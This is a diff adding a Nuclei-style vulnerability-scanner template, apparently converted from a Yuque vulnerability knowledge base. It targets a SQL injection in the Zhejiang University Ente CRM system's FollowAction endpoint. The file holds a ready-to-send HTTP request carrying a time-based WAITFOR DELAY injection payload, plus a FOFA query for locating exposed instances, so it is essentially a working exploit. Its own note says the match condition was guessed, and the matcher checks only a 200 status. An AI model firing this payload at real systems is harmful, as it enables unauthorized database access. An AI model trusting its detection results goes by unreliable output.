@@ -1,0 +1,40 @@
+id: poc-iv9xl5xw7uqq0fxh
+info:
+  name: 浙大恩特客户资源管理系统-FollowAction接口存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iv9xl5xw7uqq0fxh
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iv9xl5xw7uqq0fxh
+    fofa: title="欢迎使用浙大恩特客户资源管理系统" || body="script/Ent.base.js" || app="浙大恩特客户资源管理系统"
+http:
+- raw:
+  - 'POST /entsoft/FollowAction.entphone;.js HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 72
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Cookie: JSESSIONID=E98C1EA3DF722664DCE3B6BE705F2678
+
+
+    method=updreadFlg&trk_id=a&readFlag=a%27;WAITFOR%20DELAY%20%270:0:4%27--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
